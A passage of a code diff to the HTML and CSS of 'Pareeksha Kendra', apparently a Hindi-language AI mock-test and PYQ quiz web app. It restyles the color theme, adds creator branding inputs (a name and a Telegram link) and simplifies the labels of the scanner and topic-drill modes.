@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="hi" data-theme="light">
 <head>
@@ -8,45 +6,45 @@
   <title>AI Master Quiz Engine | Pareeksha Kendra</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      --bg: #f8fafc;
+      --bg: #fffbf2;
       --card-bg: #ffffff;
-      --card-border: #e2e8f0;
-      --card-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.06);
-      --text-main: #0f172a;
-      --text-muted: #64748b;
-      --accent-gold: #ff5722;
-      --accent-emerald: #10b981;
-      --accent-blue: #2563eb;
-      --accent-telegram: #0088cc;
+      --card-border: #f0e6d2;
+      --card-shadow: 0 4px 20px -2px rgba(194, 65, 12, 0.05);
+      --text-main: #2b1810;
+      --text-muted: #7c6858;
+      --accent-gold: #c2410c;
+      --accent-emerald: #15803d;
+      --accent-blue: #1d4ed8;
+      --accent-burgundy: #7f1d1d;
       --danger: #dc2626;
-      --input-bg: #f1f5f9;
-      --opt-bg: #f8fafc;
-      --opt-border: #cbd5e1;
+      --input-bg: #fffaf0;
+      --opt-bg: #fffaf0;
+      --opt-border: #e8d9c5;
       --green-light: #ecfdf5;
-      --orange-light: rgba(255, 87, 34, 0.12);
+      --orange-light: rgba(194, 65, 12, 0.1);
     }
 
     [data-theme="dark"] {
-      --bg: #07090e;
+      --bg: #090d16;
       --card-bg: #111827;
       --card-border: rgba(255, 255, 255, 0.12);
       --card-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
       --text-main: #f8fafc;
       --text-muted: #94a3b8;
-      --accent-gold: #ff7043;
+      --accent-gold: #fb923c;
       --accent-emerald: #10b981;
-      --accent-blue: #3b82f6;
-      --accent-telegram: #229ed9;
+      --accent-blue: #38bdf8;
+      --accent-burgundy: #991b1b;
       --danger: #ef4444;
       --input-bg: #0b101b;
       --opt-bg: rgba(255, 255, 255, 0.04);
       --opt-border: rgba(255, 255, 255, 0.1);
       --green-light: rgba(16, 185, 129, 0.15);
-      --orange-light: rgba(255, 87, 34, 0.15);
+      --orange-light: rgba(251, 146, 60, 0.15);
     }
 
     * {
@@ -64,19 +62,22 @@
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      padding-top: max(env(safe-area-inset-top), 44px);
+      padding-top: max(env(safe-area-inset-top), 40px);
       padding-bottom: max(env(safe-area-inset-bottom), 30px);
       padding-left: 16px;
       padding-right: 16px;
+      max-width: 520px;
+      margin: 0 auto;
     }
 
     header {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 10px 0 16px;
-      border-bottom: 1px solid var(--card-border);
+      padding: 8px 0 14px;
+      border-bottom: 1.5px solid var(--card-border);
       margin-bottom: 14px;
+      width: 100%;
     }
 
     .brand {
@@ -136,12 +137,12 @@
       box-shadow: var(--card-shadow);
     }
 
-    /* --- 2-IN-1 MODE SWITCHER TABS --- */
     .mode-switch-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 8px;
       margin-bottom: 14px;
+      width: 100%;
     }
 
     .mode-tab-btn {
@@ -152,7 +153,6 @@
       color: var(--text-muted);
       cursor: pointer;
       text-align: center;
-      transition: all 0.2s ease;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -161,47 +161,41 @@
 
     .mode-tab-btn.active {
       border-color: var(--accent-gold) !important;
-      background: rgba(255, 87, 34, 0.08) !important;
+      background: var(--orange-light) !important;
       color: var(--accent-gold) !important;
-      box-shadow: 0 4px 14px rgba(255, 87, 34, 0.2);
-    }
-
-    .mode-title {
-      font-family: 'Outfit', sans-serif;
-      font-weight: 800;
-      font-size: 0.92rem;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .mode-desc {
-      font-size: 0.68rem;
-      font-weight: 600;
-      opacity: 0.85;
+      box-shadow: 0 4px 14px rgba(194, 65, 12, 0.15);
     }
 
     .card {
       background: var(--card-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 18px;
-      padding: 18px;
+      border: 1.5px solid var(--card-border);
+      border-radius: 24px;
+      padding: 20px;
       box-shadow: var(--card-shadow);
       margin-bottom: 16px;
+      width: 100%;
+    }
+
+    /* CREATOR BRANDING BOX */
+    .branding-box {
+      background: linear-gradient(135deg, rgba(254, 243, 199, 0.5), rgba(255, 237, 213, 0.5));
+      border: 1.5px dashed var(--accent-gold);
+      border-radius: 18px;
+      padding: 14px;
+      margin-bottom: 14px;
+    }
+
+    [data-theme="dark"] .branding-box {
+      background: rgba(255, 255, 255, 0.04);
     }
 
     .upload-zone {
-      border: 2px dashed rgba(255, 87, 34, 0.4);
-      border-radius: 16px;
-      padding: 20px 14px;
+      border: 2px dashed rgba(194, 65, 12, 0.4);
+      border-radius: 18px;
+      padding: 22px 14px;
       text-align: center;
       cursor: pointer;
-      background: rgba(255, 87, 34, 0.03);
-    }
-
-    .upload-zone:active {
-      transform: scale(0.98);
-      background: rgba(255, 87, 34, 0.08);
+      background: rgba(194, 65, 12, 0.03);
     }
 
     .preview-img {
@@ -266,7 +260,7 @@
       width: 100%;
       padding: 10px 12px;
       background: var(--input-bg);
-      border: 1px solid var(--card-border);
+      border: 1.5px solid var(--card-border);
       border-radius: 10px;
       color: var(--text-main);
       font-size: 0.82rem;
@@ -279,21 +273,22 @@
 
     .btn-action {
       width: 100%;
-      padding: 14px;
-      border-radius: 14px;
+      padding: 15px;
+      border-radius: 16px;
       border: none;
-      background: linear-gradient(135deg, #ff5722, #f43f5e);
+      background: linear-gradient(135deg, #7f1d1d, #450a0a);
       color: #ffffff;
       font-family: 'Outfit', sans-serif;
       font-size: 1.05rem;
-      font-weight: 800;
+      font-weight: 900;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
       margin-top: 16px;
-      box-shadow: 0 4px 18px rgba(255, 87, 34, 0.35);
+      box-shadow: 0 6px 20px rgba(127, 29, 29, 0.35);
+      text-transform: uppercase;
     }
 
     .btn-action:disabled {
@@ -301,14 +296,167 @@
       cursor: not-allowed;
     }
 
+    /* 🌟 ROYAL START SCREEN (MATCHING ANKIT'S SCREENSHOT) */
+    .top-pill-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(194, 65, 12, 0.1);
+      border: 1px solid rgba(194, 65, 12, 0.3);
+      color: var(--accent-gold);
+      font-size: 0.76rem;
+      font-weight: 800;
+      padding: 6px 16px;
+      border-radius: 30px;
+      margin-bottom: 12px;
+      letter-spacing: 0.5px;
+    }
+
+    .hero-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.6rem;
+      font-weight: 900;
+      line-height: 1.25;
+      color: var(--text-main);
+      margin-bottom: 6px;
+      letter-spacing: -0.5px;
+      text-transform: uppercase;
+    }
+
+    .hero-sub {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+
+    .presenter-card {
+      background: linear-gradient(135deg, rgba(255, 247, 230, 0.9), rgba(255, 237, 213, 0.9));
+      border: 1.5px solid #fed7aa;
+      border-radius: 20px;
+      padding: 16px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    [data-theme="dark"] .presenter-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-color: rgba(255, 255, 255, 0.12);
+    }
+
+    .presenter-label {
+      font-size: 0.72rem;
+      font-weight: 900;
+      color: #9a3412;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+
+    .presenter-name {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 900;
+      color: var(--text-main);
+      letter-spacing: 0.5px;
+    }
+
+    .stats-trio-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .stat-mini-box {
+      background: var(--card-bg);
+      border: 1.5px solid var(--card-border);
+      border-radius: 16px;
+      padding: 12px 6px;
+      text-align: center;
+    }
+
+    .stat-num {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.25rem;
+      font-weight: 900;
+      color: var(--text-main);
+    }
+
+    .stat-lbl {
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .btn-main {
+      width: 100%;
+      padding: 15px;
+      border-radius: 16px;
+      border: none;
+      background: linear-gradient(135deg, #7f1d1d, #450a0a);
+      color: #fff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.05rem;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 20px rgba(127, 29, 29, 0.35);
+      text-transform: uppercase;
+      margin-top: 14px;
+    }
+
+    .btn-join-tg {
+      width: 100%;
+      padding: 13px;
+      border-radius: 14px;
+      border: 1.5px solid #fed7aa;
+      background: #fffaf0;
+      color: #9a3412;
+      font-weight: 800;
+      font-size: 0.88rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+
+    [data-theme="dark"] .btn-join-tg {
+      background: rgba(255, 255, 255, 0.05);
+      border-color: rgba(255, 255, 255, 0.15);
+      color: #fed7aa;
+    }
+
+    .sph-footer {
+      text-align: center;
+      margin-top: 24px;
+      padding-top: 14px;
+      border-top: 1px dashed var(--card-border);
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .sph-footer a {
+      color: var(--accent-blue);
+      text-decoration: none;
+      font-weight: 800;
+    }
+
     /* LOADER */
     .loader-box {
       display: none;
       text-align: center;
       padding: 24px 14px;
-      background: rgba(255, 87, 34, 0.04);
-      border: 1px solid rgba(255, 87, 34, 0.2);
-      border-radius: 18px;
+      background: var(--orange-light);
+      border: 1.5px solid var(--accent-gold);
+      border-radius: 20px;
       margin-top: 16px;
     }
 
@@ -364,86 +512,16 @@
       color: var(--accent-gold);
     }
 
-    /* ACTION HUB BUTTONS */
+    /* ACTION HUB VIEW (NOW USES ROYAL START SCREEN) */
     #actionHubView {
       display: none;
-    }
-
-    .btn-play-now {
       width: 100%;
-      padding: 15px;
-      border-radius: 14px;
-      border: none;
-      background: linear-gradient(135deg, #ff5722, #f43f5e);
-      color: #ffffff;
-      font-family: 'Outfit', sans-serif;
-      font-size: 1.05rem;
-      font-weight: 800;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 10px;
-      box-shadow: 0 4px 18px rgba(255, 87, 34, 0.3);
-    }
-
-    .btn-download-direct {
-      width: 100%;
-      padding: 14px;
-      border-radius: 14px;
-      border: none;
-      background: linear-gradient(135deg, #2563eb, #1d4ed8);
-      color: #ffffff;
-      font-family: 'Outfit', sans-serif;
-      font-size: 1rem;
-      font-weight: 800;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 10px;
     }
 
     /* QUIZ VIEW */
     #quizView {
       display: none;
-    }
-
-    .quiz-progress-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 14px;
-      padding-bottom: 10px;
-      border-bottom: 1px solid var(--card-border);
-      gap: 8px;
-    }
-
-    .live-q-timer {
-      background: rgba(255, 87, 34, 0.12);
-      border: 1px solid var(--accent-gold);
-      color: var(--accent-gold);
-      padding: 4px 10px;
-      border-radius: 20px;
-      font-family: 'Outfit', monospace;
-      font-weight: 800;
-      font-size: 0.85rem;
-    }
-
-    .btn-open-palette {
-      background: rgba(37, 99, 235, 0.1);
-      border: 1px solid var(--accent-blue);
-      color: var(--accent-blue);
-      padding: 5px 12px;
-      border-radius: 20px;
-      font-size: 0.78rem;
-      font-weight: 800;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      gap: 5px;
+      width: 100%;
     }
 
     .q-text {
@@ -465,7 +543,7 @@
       padding: 14px 16px;
       background: var(--opt-bg);
       border: 1.5px solid var(--opt-border);
-      border-radius: 12px;
+      border-radius: 14px;
       color: var(--text-main);
       font-size: 0.92rem;
       cursor: pointer;
@@ -476,13 +554,8 @@
 
     .opt-btn.selected {
       border-color: var(--accent-gold) !important;
-      background: rgba(255, 87, 34, 0.08) !important;
+      background: var(--orange-light) !important;
       font-weight: 700;
-    }
-
-    .opt-btn.selected .opt-tag {
-      background: var(--accent-gold);
-      color: #ffffff;
     }
 
     .opt-btn.correct {
@@ -498,7 +571,7 @@
     }
 
     .opt-btn.wrong {
-      background: rgba(239, 68, 68, 0.15) !important;
+      background: rgba(220, 38, 38, 0.12) !important;
       border-color: var(--danger) !important;
       color: var(--danger) !important;
     }
@@ -521,14 +594,10 @@
       flex-shrink: 0;
     }
 
-    [data-theme="dark"] .opt-tag {
-      background: rgba(255, 255, 255, 0.1);
-    }
-
     .expl-box {
       margin-top: 14px;
       padding: 14px;
-      background: rgba(255, 87, 34, 0.08);
+      background: var(--orange-light);
       border-left: 4px solid var(--accent-gold);
       border-radius: 8px;
       font-size: 0.85rem;
@@ -546,7 +615,7 @@
       flex: 1;
       padding: 13px;
       border-radius: 12px;
-      border: 1px solid var(--card-border);
+      border: 1.5px solid var(--card-border);
       background: var(--opt-bg);
       color: var(--text-main);
       cursor: pointer;
@@ -558,31 +627,169 @@
       gap: 5px;
     }
 
-    .nav-btn-mark {
-      border-color: #f59e0b;
-      color: #d97706;
-      background: #fef3c7;
-    }
-
-    [data-theme="dark"] .nav-btn-mark {
-      background: rgba(245, 158, 11, 0.15);
-      color: #f59e0b;
-    }
-
     .nav-btn-submit {
-      background: linear-gradient(135deg, #ff5722, #f43f5e);
+      background: linear-gradient(135deg, #7f1d1d, #450a0a);
       color: #fff;
       border: none;
-      flex: 1.2;
+      flex: 1.3;
     }
 
-    /* STRICT POPUP MODAL OVERLAY (100% POPUP ONLY) */
+    /* 🏆 SCORECARD VIEW (MATCHING ANKIT'S PREVIOUS SCREENSHOT) */
+    #scorecardView {
+      display: none;
+      width: 100%;
+    }
+
+    .score-hero-card {
+      background: var(--card-bg);
+      border: 1.5px solid var(--card-border);
+      border-radius: 24px;
+      padding: 28px 18px;
+      text-align: center;
+      box-shadow: var(--card-shadow);
+      width: 100%;
+    }
+
+    .score-trophy-img {
+      font-size: 46px;
+      margin-bottom: 6px;
+    }
+
+    .score-topic-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.55rem;
+      font-weight: 900;
+      color: var(--text-main);
+      margin-bottom: 2px;
+    }
+
+    .score-sub-inst {
+      font-size: 0.76rem;
+      font-weight: 800;
+      color: var(--text-muted);
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+
+    .score-giant-number {
+      font-family: 'Outfit', sans-serif;
+      font-size: 3.2rem;
+      font-weight: 900;
+      color: #ff5722;
+      line-height: 1;
+      margin-bottom: 6px;
+      letter-spacing: -1px;
+    }
+
+    .score-candidate-line {
+      font-size: 0.8rem;
+      font-weight: 900;
+      color: var(--text-muted);
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      margin-bottom: 20px;
+    }
+
+    .score-stats-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .score-stat-card {
+      border-radius: 16px;
+      padding: 14px 6px;
+      text-align: center;
+    }
+
+    .score-stat-card.c-green { background: #ecfdf5; }
+    .score-stat-card.c-green b { color: #16a34a; }
+
+    .score-stat-card.c-red { background: #fef2f2; }
+    .score-stat-card.c-red b { color: #dc2626; }
+
+    .score-stat-card.c-peach { background: #fff7ed; }
+    .score-stat-card.c-peach b { color: #ea580c; }
+
+    .score-stat-card b {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.6rem;
+      font-weight: 900;
+      display: block;
+      line-height: 1.1;
+    }
+
+    .score-stat-card span {
+      font-size: 0.75rem;
+      font-weight: 800;
+      color: var(--text-main);
+      margin-top: 4px;
+      display: block;
+    }
+
+    /* 3 SCORECARD BUTTONS */
+    .btn-score-red {
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      border: none;
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      color: #ffffff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.98rem;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 16px rgba(220, 38, 38, 0.3);
+    }
+
+    .btn-score-blue {
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      border: none;
+      background: linear-gradient(135deg, #2563eb, #1d4ed8);
+      color: #ffffff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.98rem;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 16px rgba(37, 99, 235, 0.3);
+    }
+
+    .btn-score-retake {
+      width: 100%;
+      padding: 13px;
+      border-radius: 14px;
+      border: 1.5px solid var(--card-border);
+      background: var(--opt-bg);
+      color: var(--text-main);
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    /* MODALS */
     .modal-overlay {
       position: fixed !important;
-      top: 0 !important;
-      left: 0 !important;
-      right: 0 !important;
-      bottom: 0 !important;
+      inset: 0 !important;
       background: rgba(0, 0, 0, 0.7) !important;
       backdrop-filter: blur(5px);
       display: none !important;
@@ -590,10 +797,6 @@
       justify-content: center;
       z-index: 9999 !important;
       padding: 20px;
-    }
-
-    .modal-overlay.active, .modal-overlay[style*="display: flex"] {
-      display: flex !important;
     }
 
     .modal-card {
@@ -607,67 +810,6 @@
       max-height: 85vh;
       overflow-y: auto;
     }
-
-    .palette-grid {
-      display: grid;
-      grid-template-columns: repeat(5, 1fr);
-      gap: 10px;
-      margin-top: 14px;
-      max-height: 50vh;
-      overflow-y: auto;
-      padding: 2px;
-    }
-
-    .palette-tile {
-      aspect-ratio: 1;
-      border-radius: 12px;
-      border: 1.5px solid var(--card-border);
-      background: var(--opt-bg);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Outfit', sans-serif;
-      font-weight: 800;
-      font-size: 16px;
-      cursor: pointer;
-      color: var(--text-main);
-    }
-
-    .palette-tile.active {
-      border-color: var(--accent-blue) !important;
-      color: var(--accent-blue) !important;
-      border-width: 2.5px !important;
-      transform: scale(1.05);
-    }
-
-    .palette-tile.answered {
-      background: var(--green-light) !important;
-      color: var(--accent-emerald) !important;
-      border-color: var(--accent-emerald) !important;
-    }
-
-    .palette-tile.marked {
-      background: var(--orange-light) !important;
-      color: var(--accent-gold) !important;
-      border-color: var(--accent-gold) !important;
-    }
-
-    .palette-stats-row {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 6px;
-      margin-top: 10px;
-      margin-bottom: 6px;
-      text-align: center;
-      font-size: 0.75rem;
-      font-weight: 800;
-    }
-
-    #scorecardView {
-      display: none;
-      text-align: center;
-      padding: 24px 16px;
-    }
   </style>
 </head>
 <body>
@@ -677,12 +819,12 @@
       <div class="brand-icon">P</div>
       <div>
         <div class="brand-title">PAREEKSHA KENDRA</div>
-        <div class="brand-sub">AI MOCK DRILL ENGINE</div>
+        <div class="brand-sub">AUTHENTIC TEST DRILL</div>
       </div>
     </div>
     <div class="header-actions">
       <button class="btn-icon" onclick="openHistoryModal()">
-        📚 <span id="histCount">0 Saved</span>
+        📚 <span id="histCount">0</span>
       </button>
       <button class="btn-icon" id="themeBtn" onclick="toggleTheme()">
         <span id="themeIcon">🌙</span>
@@ -693,29 +835,49 @@
     </div>
   </header>
 
-  <!-- 2-IN-1 MODE SWITCHER (SCANNER VS DIRECT TOPIC PYQ DRILL) -->
+  <!-- 2-IN-1 MODE SWITCHER -->
   <div class="mode-switch-grid" id="modeSwitcher">
     <button class="mode-tab-btn active" id="tabBtnScanner" onclick="switchEngineMode('scanner')">
-      <span class="mode-title">📷 स्कैनर मोड</span>
-      <span class="mode-desc">फोटो / 100-P PDF / नोट्स से</span>
+      <span style="font-size:14px; font-weight:800;">📷 स्कैनर मोड</span>
+      <span style="font-size:11px; opacity:0.8;">फोटो / PDF / नोट्स से</span>
     </button>
     <button class="mode-tab-btn" id="tabBtnTopic" onclick="switchEngineMode('topic')">
-      <span class="mode-title">🎯 टॉपिक PYQ ड्रिल</span>
-      <span class="mode-desc">नाम लिखो & रियल PYQ पाओ</span>
+      <span style="font-size:14px; font-weight:800;">🎯 टॉपिक PYQ ड्रिल</span>
+      <span style="font-size:11px; opacity:0.8;">नाम लिखो & रियल PYQ पाओ</span>
     </button>
   </div>
 
   <!-- 1. SETUP VIEW -->
   <div id="setupView">
     
-    <!-- MODE 1: DOCUMENT / PHOTO / PDF / TEXT SCANNER -->
+    <!-- CREATOR BRANDING INPUTS (OPTIONAL) -->
+    <div class="branding-box">
+      <div style="font-family:'Outfit'; font-size:0.88rem; font-weight:900; color:var(--accent-gold); margin-bottom:4px;">
+        👑 अपनी ब्रांडिंग जोड़ें (Creator Branding - Optional)
+      </div>
+      <div style="font-size:0.72rem; color:var(--text-muted); margin-bottom:10px;">
+        खाली छोड़ेंगे तो ऑटोमैटिक <b>ANKIT</b> और <b>PAREEKSHA KENDRA</b> रहेगा।
+      </div>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
+        <div>
+          <label>👑 क्रिएटर का नाम:</label>
+          <input type="text" id="customCreatorName" placeholder="उदा. Umesh, Rohit..." />
+        </div>
+        <div>
+          <label>📢 टेलीग्राम लिंक:</label>
+          <input type="text" id="customTelegramLink" placeholder="उदा. t.me/YourChannel..." />
+        </div>
+      </div>
+    </div>
+
+    <!-- MODE 1: SCANNER -->
     <div id="scannerModeBox">
       <div class="card">
         <div class="upload-zone" onclick="triggerUpload()">
           <div style="font-size: 32px; margin-bottom: 4px;">📷 / 📕</div>
-          <div style="font-weight: 700; font-size: 0.95rem;">किताब की मल्टीपल फ़ोटो खींचें या PDF चुनें</div>
+          <div style="font-weight: 800; font-size: 0.95rem;">किताब की मल्टीपल फ़ोटो खींचें या PDF चुनें</div>
           <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 4px;">
-            <b>मल्टीपल फ़ोटो (2, 3, 4 पेज)</b> या PDF <b>(1 से 100 पेज • 20 MB)</b>
+            <b>मल्टीपल फ़ोटो (2-10 पेज)</b> या PDF <b>(1 से 100 पेज)</b>
           </div>
         </div>
         
@@ -723,25 +885,24 @@
         <img id="previewImg" class="preview-img" alt="Preview" />
 
         <div id="multiImgPreview" class="multi-img-preview">
-          <div id="multiImgText" style="font-size: 0.85rem; font-weight: 800; color: var(--accent-gold);">📸 कुल 0 पेज चुने गए</div>
+          <div id="multiImgText" style="font-size: 0.85rem; font-weight: 800; color: var(--accent-gold);">📸 0 पेज चुने गए</div>
           <div id="multiImgThumbnails" class="thumbnails-row"></div>
         </div>
 
         <div id="pdfPreviewCard" class="pdf-card-preview">
           <div style="font-size: 26px;">📚</div>
           <div style="flex: 1; overflow: hidden;">
-            <div id="pdfFileName" style="font-size: 0.85rem; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">document.pdf</div>
-            <div id="pdfMeta" style="font-size: 0.72rem; color: var(--text-muted);">PDF Ready • 0 Pages • 0 MB</div>
+            <div id="pdfFileName" style="font-size: 0.85rem; font-weight: 800; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">document.pdf</div>
+            <div id="pdfMeta" style="font-size: 0.72rem; color: var(--text-muted);">PDF Ready</div>
           </div>
-          <div style="color: #10b981; font-weight: 800; font-size: 0.8rem;">READY</div>
+          <div style="color: #10b981; font-weight: 900; font-size: 0.8rem;">READY</div>
         </div>
 
         <div id="pdfRangeBox" style="display: none; margin-top: 10px;">
-          <label style="color: var(--accent-blue); font-weight: 700;">📄 पेज रेंज (वैकल्पिक, उदा: 5-15 या पूरा पढ़ने के लिए खाली छोड़ें):</label>
+          <label style="color: var(--accent-blue); font-weight: 700;">📄 पेज रेंज (वैकल्पिक, उदा: 5-15):</label>
           <input type="text" id="pdfPageRange" placeholder="जैसे: 1-10, 15-25 (Optional)" />
         </div>
 
-        <!-- OR PASTE TEXT DIRECTLY -->
         <div style="margin-top: 14px;">
           <label style="color: var(--accent-gold); font-weight: 800;">📝 या सीधे टेक्स्ट/नोट्स यहाँ पेस्ट करें (Optional):</label>
           <textarea id="pastedTextInput" rows="3" placeholder="यहाँ कोई भी प्रश्न या नोट्स पेस्ट करें..."></textarea>
@@ -749,14 +910,14 @@
 
         <div class="config-grid">
           <div class="full-width-col">
-            <label>🏷️ क्विज़ / चैप्टर का नाम (Topic Name - अनिवार्य *):</label>
-            <input type="text" id="quizTopicInput" placeholder="उदा. Sports GK, History Ch-1, Polity PYQ..." required />
+            <label>🏷️ क्विज़ / चैप्टर का नाम (Topic Name *):</label>
+            <input type="text" id="quizTopicInput" placeholder="उदा. Practice Drill, History Ch-1..." required />
           </div>
 
           <div>
             <label>AI Model Engine</label>
             <select id="modelSelect">
-              <option value="gemini-3.6-flash" selected>⚡ Gemini 3.6 Flash (Latest)</option>
+              <option value="gemini-3.6-flash" selected>⚡ Gemini 3.6 Flash</option>
               <option value="gemini-3.5-flash">⚡ Gemini 3.5 Flash</option>
               <option value="gemini-3.5-flash-lite">⚡ Gemini 3.5 Flash-Lite</option>
             </select>
@@ -780,9 +941,9 @@
           <div class="full-width-col">
             <label>🌐 भाषा (Language):</label>
             <select id="langSelect">
-              <option value="hi" selected>🇮🇳 केवल हिंदी में (Hindi Only - Superfast ⚡)</option>
-              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Hindi + English Bilingual)</option>
-              <option value="en">🇬🇧 Only English (English Only)</option>
+              <option value="hi" selected>🇮🇳 केवल हिंदी में (Hindi Only)</option>
+              <option value="bilingual">🇮🇳 🇬🇧 दोनों भाषाओं में (Bilingual)</option>
+              <option value="en">🇬🇧 Only English</option>
               <option value="original">📖 जैसा मूल किताब में है</option>
             </select>
           </div>
@@ -794,21 +955,21 @@
       </div>
     </div>
 
-    <!-- MODE 2: DIRECT TOPIC / CHAPTER PYQ DRILL (REAL EXAM TAGS) -->
+    <!-- MODE 2: TOPIC PYQ DRILL -->
     <div id="topicModeBox" style="display: none;">
       <div class="card">
-        <div style="background: rgba(37,99,235,0.06); border: 1.5px solid var(--accent-blue); border-radius: 14px; padding: 12px; margin-bottom: 14px;">
-          <div style="font-family:'Outfit'; font-weight:800; color:var(--accent-blue); font-size: 0.95rem; margin-bottom: 2px;">
-            🎯 100% Authentic Previous Year Questions (PYQs)
+        <div style="background: rgba(37,99,235,0.06); border: 1.5px solid var(--accent-blue); border-radius: 16px; padding: 12px; margin-bottom: 14px;">
+          <div style="font-family:'Outfit'; font-weight:800; color:var(--accent-blue); font-size: 0.95rem;">
+            🎯 100% Authentic Previous Year Questions
           </div>
-          <div style="font-size: 0.73rem; color: var(--text-muted); line-height: 1.4;">
-            बिना किसी फ़ोटो या PDF के, सिर्फ टॉपिक का नाम लिखें और असली परीक्षा टैग्स (जैसे: [SSC CGL 2024], [NTPC 2022]) के साथ लाइव टेस्ट पाएँ!
+          <div style="font-size: 0.73rem; color: var(--text-muted); margin-top: 2px;">
+            सिर्फ टॉपिक का नाम लिखें और परीक्षा टैग्स के साथ लाइव टेस्ट पाएँ!
           </div>
         </div>
 
         <div style="margin-bottom: 12px;">
           <label style="color: var(--accent-gold); font-size: 0.85rem;">🎯 किस टॉपिक / चैप्टर का टेस्ट देना है?</label>
-          <input type="text" id="directTopicInput" placeholder="उदा. मौलिक अधिकार, सिंधु घाटी सभ्यता, Percentage, Idioms..." />
+          <input type="text" id="directTopicInput" placeholder="उदा. Computer, मौलिक अधिकार, Profit & Loss..." />
         </div>
 
         <div class="config-grid">
@@ -826,13 +987,13 @@
           <div>
             <label>सवालों की संख्या (Count):</label>
             <select id="topicQCount">
-              <option value="10" selected>10 Questions (Quick Drill)</option>
+              <option value="10" selected>10 Questions</option>
               <option value="15">15 Questions</option>
-              <option value="20">20 Questions (Mock Set)</option>
-              <option value="25">25 Questions (Exam Drill)</option>
-              <option value="30">30 Questions (Super Drill)</option>
-              <option value="50">50 Questions (Half Mock)</option>
-              <option value="75">75 Questions (Deep Drill)</option>
+              <option value="20">20 Questions</option>
+              <option value="25">25 Questions</option>
+              <option value="30">30 Questions</option>
+              <option value="50">50 Questions</option>
+              <option value="75">75 Questions</option>
               <option value="100">100 Questions (Mega Mock 🏆)</option>
               <option value="all">🔥 सभी महत्वपूर्ण सवाल (All PYQs)</option>
             </select>
@@ -867,199 +1028,136 @@
         <span class="stopwatch-num" id="stopwatchSec">00:00</span>
       </div>
 
-      <div id="loaderStatusText" style="font-size: 0.88rem; color: var(--text-main); font-weight: 700; margin-top: 4px;">
+      <div id="loaderStatusText" style="font-size: 0.88rem; font-weight: 700;">
         AI सवाल तैयार कर रहा है...
       </div>
     </div>
   </div>
 
-  <!-- 2. ACTION HUB -->
